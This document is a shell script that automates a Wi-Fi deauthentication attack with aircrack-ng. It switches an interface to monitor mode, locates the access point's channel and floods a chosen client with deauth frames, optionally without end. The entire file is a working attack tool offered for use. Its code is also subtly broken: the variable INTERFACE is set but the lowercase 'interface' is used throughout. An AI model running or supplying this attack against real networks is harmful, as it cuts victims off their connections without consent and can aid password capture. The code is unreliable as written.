#!/bin/sh

# Change these parameters

INTERFACE="wlan0" # name of wifi interface
AP_BSSID=DE:EE:AD:BE:EE:FF # access point MAC address
CLIENT_BSSID=AA:BB:CC:DD:EE:FF # target client MAC address
COUNT=100 # You can set COUNT to 0 to run the attack indefinitely

clean() {
echo "
$SCRIPT: switching back to managed mode..."
sudo airmon-ng stop "${interface}mon" >/dev/null
}

if [ "$1" == '-h' -o "$1" == '--help' ]; then
  echo "\
Launch automated deauthentification wifi attack on targeted access point and client (using aircrack-ng)

Options :
  -h, --help  display this help and exit

Change the following parameters in the script :
interface, AP BSSID, Client BSSID and deauth count"
  exit 0
fi

which aircrack-ng >/dev/null || exit 1
which ip >/dev/null || exit 1

sudo echo "\
Target access point : $AP_BSSID
Target client : $CLIENT_BSSID"

if ! ip addr show "${interface}mon" &>/dev/null; then
  echo "$0: switching $interface to monitor mode..."
  sudo airmon-ng start "$interface" >/dev/null || exit 1
fi

SCRIPT=$0
trap 'exit 1' 1 2 3 15
trap clean EXIT
output=$(sudo aireplay-ng --test -a "$AP_BSSID" -c "$CLIENT_BSSID" "${interface}mon" 2>&1)
echo $output | grep "No such BSSID" && { echo $output >&2; exit 1; }
AP_channel=$(echo $output | awk '/but the AP/ {print $NF}')
if [ "$AP_channel" ]; then
  echo "$0: setting ${interface}mon to AP channel $AP_channel..."
  sudo airmon-ng start "${interface}mon" $AP_channel >/dev/null || exit 1
fi

echo "$0: Starting deauth attack..."
sleep 1
sudo aireplay-ng --deauth $COUNT -a $AP_BSSID -c $CLIENT_BSSID "${interface}mon"
